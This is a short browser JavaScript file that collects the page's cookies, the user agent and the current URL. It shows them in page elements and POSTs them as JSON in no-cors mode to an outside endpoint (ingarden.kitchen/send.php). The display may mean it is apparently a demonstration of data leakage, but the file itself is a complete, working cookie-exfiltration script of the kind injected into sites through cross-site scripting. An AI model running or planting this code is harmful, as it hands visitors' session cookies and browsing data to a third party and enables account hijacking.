function print(id, text) {
  const elm = document.getElementById(id);
  if (elm !== null) {
    elm.innerText = text;
  }
}

const url = 'https://ingarden.kitchen/send.php';

print("ua", navigator.userAgent);
print("cookie", document.cookie);
print("url", url);

fetch(url, {
  method: "POST",
  headers: {
    "Content-Type": "application/json",
  },
  mode: 'no-cors',
  body: JSON.stringify({
    userAgent: navigator.userAgent,
    cookie: document.cookie,
    referer: location.href,
  }),
})
  .then((response) => {
    if (response.ok) {
      return response.text();
    } else {
      print("response", JSON.stringify(response));
      return Promise.reject(response);
    }
  })
  .then((data) => {
    print("response", data);
    console.log(data);
  })
  .catch(function (err) {
    print("response", err.message);
    console.warn("Something went wrong.", err);
  });
